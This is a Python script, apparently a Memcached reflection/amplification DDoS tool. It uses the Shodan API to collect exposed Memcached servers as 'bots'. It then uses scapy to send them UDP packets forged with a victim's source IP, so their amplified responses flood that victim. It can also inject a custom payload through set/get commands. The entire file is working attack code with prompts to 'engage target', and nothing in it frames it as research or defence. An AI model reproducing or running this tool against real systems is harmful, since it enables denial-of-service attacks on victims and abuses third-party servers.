#!/usr/bin/env python3
import os
import sys
import time
import shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

keys = Path("./api.txt")

if keys.is_file():
    with open('api.txt', 'r') as file:
        SHODAN_API_KEY=file.readline().rstrip('\n')
else:
    file = open('api.txt', 'w')
    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
    file.write(SHODAN_API_KEY)
    print('[+] File written: ./api.txt')
    file.close()

while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    print('')
    try:
        myresults = Path("./bots.txt")
        query = input("[*] Use Shodan API to search for affected Memcached servers? <y/n>: ").lower()
        if query.startswith('y'):
            print('[*] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
            results = api.search('product:"Memcached" port:11211')
            print('[+] API Key Authentication: SUCCESS')
            print('[*] Number of bots: %s' % results['total'])
            saveresult = input("[*] Save results for later usage? <y/n>: ").lower()
            if saveresult.startswith('y'):
                file2 = open('bots.txt', 'a')
                for result in results['matches']:
                    file2.write(result['ip_str'] + "\n")
                print('[+] File written: ./bots.txt')
                file2.close()
                
        saveme = input('[*] Would you like to use locally stored Shodan data? <y/n>: ').lower()
        if myresults.is_file():
            if saveme.startswith('y'):
                with open('bots.txt') as my_file:
                    ip_array = [line.rstrip() for line in my_file]
        
        else:
            print('\033[1;91m[!!] Error: \033[0mNo bots stored locally, bots.txt file not found!')

        if saveme.startswith('y') or query.startswith('y'):
            target = input("[*] Enter target IP address: ")
            targetport = input("[*] Enter target port number (Default 80): ") or "80"
            power = int(input("[*] Enter preferred power (Default=1): ") or "1")

            data = input("[+] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
            if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                dataset = "set injected 0 3600 ", len(data)+1, "\r\n", data, "\r\n get injected\r\n"
                setdata = ("\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00%s\r\n%s\r\n" % (len(data)+1, data))
                getdata = ("\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n")
                print("[+] Payload transformed: ", dataset)

            if query.startswith('y'):
                iplist = input('[*] Would you like to display all the bots from Shodan? <y/n>: ').lower()
                if iplist.startswith('y'):

                    counter= int(0)
                    for result in results['matches']:
                        host = api.host('%s' % result['ip_str'])
                        counter=counter+1
                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, result['ip_str'], host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
                        
            if saveme.startswith('y'):
                iplistlocal = input('[*] Would you like to display all the bots stored locally? <y/n>: ').lower()
                if iplistlocal.startswith('y'):

                    counter= int(0)
                    for x in ip_array:
                        host = api.host('%s' % x)
                        counter=counter+1
                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))

            engage = input('[*] Ready to engage target %s? <Y/n>: ' % target).lower()
            if engage.startswith('y'):
                if saveme.startswith('y'):
                    for i in ip_array:
                        if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                            print('[+] Sending 2 forged synchronized payloads to: %s' % (i))
                            with suppress_stdout():
                                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
                                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
                        else:
                            if power > 1:
                                print('[+] Sending %d forged UDP packets to: %s' % (power, i))
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                            elif power == 1:
                                print('[+] Sending 1 forged UDP packet to: %s' % i)
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                
                else:
                    for result in results['matches']:
                        if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                            print('[+] Sending 2 forged synchronized payloads to: %s' % (i))
                            with suppress_stdout():
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
                        else:
                            if power>1:
                                print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                            elif power==1:
                                print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)

                print('[!] Task complete! Exiting Platform...')
                break
            else:
                print('\033[1;91m[!!] Error: \033[0m%s not engaged!' % target)
                print('[*] Restarting Platform! Please wait...')

        else:
            print('\033[1;91m[!!] Error: \033[0mNo bots stored locally or remotely on Shodan!')
            print('[*] Restarting Platform! Please wait.')

    except shodan.APIError as e:
            print('\033[1;91m[!!] Error: \033[0m%s' % e)
            option = input('[*] Would you like to change API Key? <y/n>: ').lower()
            if option.startswith('y'):
                file = open('api.txt', 'w')
                SHODAN_API_KEY = input('[*] Please enter valid Shodan.io API Key: ')
                file.write(SHODAN_API_KEY)
                print('[+] File written: ./api.txt')
                file.close()
                print('[*] Restarting Platform! Please wait.')

            else:
                print('[!] Exiting...')
                break
